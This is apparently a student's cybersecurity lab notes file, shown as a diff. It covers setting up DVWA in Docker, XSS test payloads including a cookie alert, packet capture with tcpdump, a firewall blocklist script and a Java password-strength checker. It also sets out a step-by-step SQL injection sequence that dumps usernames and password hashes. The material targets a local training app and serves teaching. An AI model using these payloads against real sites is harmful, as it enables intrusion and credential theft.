@@ -1,0 +1,212 @@
+dvwa docker commands 
+sudo apt update
+sudo apt install docker.io -y
+sudo su
+systemctl  start docker 
+systemctl enable docker
+docker pull vulnerables/dvwa
+docker run -rm -it -p 8080:80 vulnerables/dvwa
+
+
+
+open http://localhost:8080
+
+--------------------------------------------------------------------
+dvwa xss vulnerability 
+
+sudo service apache2 start
+sudo service mysql start
+
+http://localhost/dvwa
+
+Username: admin
+Password: password
+
+DVWA Security → Low → Submit
+
+<script>alert('XSS')</script>
+
+<h1>Hacked</h1>
+<script>alert('Stored XSS')</script>
+
+#<script>alert('DOM XSS')</script>
+
+<script>alert(document.cookie)</script>
+
+DVWA Security → Medium
+DVWA Security → High
+
+
+dvwa sql injection 
+----------------------------------------------------
+sudo apt update
+sudo apt install dvwa –y
+
+sudo service apache2 start
+sudo service mysql start
+
+sudo nano /etc/dvwa/config.inc.php
+$_DVWA['db_password'] = '';
+
+http://127.0.0.1/dvwa
+
+Username: admin
+Password: password
+
+1
+
+1' OR '1'='1
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+1' UNION SELECT 1,2-- -
+
+1' UNION SELECT database(),2-- -
+
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+1' UNION SELECT user,password FROM users-- -
+
+
+
+packet sniffing 
+
+----------------------------------------------------------------------
+python3 -m http.server 8080
+
+sudo tcpdump -i any -w capture.pcap port 8080
+
+http://localhost:8080
+
+http://localhost:8080/
+
+http.request.method == "GET"
+
+
+
+
+CODES 
+
+firewall blocking ips
+
+import requests
+import csv
+import subprocess
+import io
+
+url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+
+print("[+] Downloading IP blocklist...")
+response = requests.get(url)
+
+if response.status_code != 200:
+    print("[-] Failed to download list")
+    exit()
+
+print("[+] Removing old firewall rule (if exists)...")
+subprocess.run([
+    "powershell",
+    "-Command",
+    'netsh advfirewall firewall delete rule name="BadIPs"'
+], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+print("[+] Parsing CSV...")
+
+lines = [
+    line for line in response.text.splitlines()
+    if not line.startswith("#") and line.strip() != ""
+]
+
+csv_reader = csv.reader(lines)
+
+blocked_count = 0
+
+for row in csv_reader:
+    ip = row[0].strip()
+
+    if ip.lower() == "dst_ip":
+        continue
+
+    rule_out = f'netsh advfirewall firewall add rule name="BadIPs" dir=out action=block remoteip={ip}'
+    rule_in  = f'netsh advfirewall firewall add rule name="BadIPs" dir=in action=block remoteip={ip}'
+
+    subprocess.run(["powershell", "-Command", rule_out], stdout=subprocess.DEVNULL)
+    subprocess.run(["powershell", "-Command", rule_in], stdout=subprocess.DEVNULL)
+
+    blocked_count += 1
+    print(f"[+] Blocked {ip}")
+
+print(f"\n Done. Total IPs blocked: {blocked_count}")
+
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------
+
+password strength
+import java.util.*;
+class password{
+public static String checkPasswordStrength(String password){
+    if(password.length()<8){
+        return "Weak: Password must be at least 8 characters long.";
+    }
+    boolean hasDigit=false;
+    boolean hasUpper=false;
+    boolean hasLower=false;
+    boolean hasSpecial = false;
+    for(char ch:password.toCharArray()){
+        if(Character.isDigit(ch)){
+            hasDigit=true;
+        }
+        if(Character.isUpperCase(ch)){
+            hasUpper=true;
+        }
+        if(Character.isLowerCase(ch)){
+            hasLower=true;
+        }
+    if(!Character.isLetterOrDigit(ch)){
+        hasSpecial = true;
+        }
+
+    }
+    if(!hasDigit){
+        return "Weak: Password must contain at least one digit.";
+    }
+    if(!hasUpper){
+        return "Weak: Password must contain at least one uppercase letter.";
+    }
+    if(!hasLower){
+        return "Weak: Password must contain at least one lowercase letter.";
+    } 
+    if(!hasSpecial){
+    return "Weak: Password must contain at least one special character.";
+}
+
+    return "Strong password.";
+}
+public static void main(String[] args){
+    Scanner s=new Scanner(System.in);
+    System.out.println("Welcome to the Password Strength Checker");
+        while (true) {
+            System.out.print("\nEnter your password (or type exit to quit): ");
+            String password = s.nextLine();
+
+            if (password.equalsIgnoreCase("exit")) {
+                System.out.println("Thank you for using the Password Strength Checker! Goodbye!");
+                break;
+            }
+            String result = checkPasswordStrength(password);
+            System.out.println(result);
+        } 
+}
+}
